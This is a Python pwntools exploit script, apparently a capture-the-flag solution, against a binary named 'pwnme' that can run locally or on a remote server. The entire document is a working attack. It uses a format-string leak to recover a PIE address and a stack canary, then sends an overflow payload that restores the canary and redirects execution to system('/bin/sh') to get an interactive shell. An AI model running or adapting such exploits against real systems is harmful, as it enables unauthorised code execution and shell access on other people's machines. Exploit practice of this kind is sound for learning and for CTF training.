from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
b*vuln + 118
continue
'''.format(**locals())

exe = './pwnme'
elf = context.binary = ELF(exe, checksec=False)

# for i in range(20):
#     p = start()
#     p.sendlineafter(b"?", f"%{i}$08lx".encode())
#     print(i, p.recv(8))
#     p.close()

#  3 -> vuln+16
# 19 -> canary 

p = start()
p.sendlineafter(b"?", b"%3$08lx %19$08lx")
leak_pie, leak_canary = [int(x, 16) for x in p.recv(17).split()]

info("Leak pie: 0x%x", leak_pie)
info("Leak canary: 0x%x", leak_canary)

elf.address = leak_pie - (elf.sym.vuln + 16)


offset = 40
payload = flat(
    cyclic(24),
    leak_canary,
    cyclic(offset - 24 - 4 - 8),
    elf.got.system - 0x1c,
    b'junk',
    elf.sym.system,
    b'junk',
    next(elf.search(b"/bin/sh"))
)

p.sendline(payload)
p.interactive()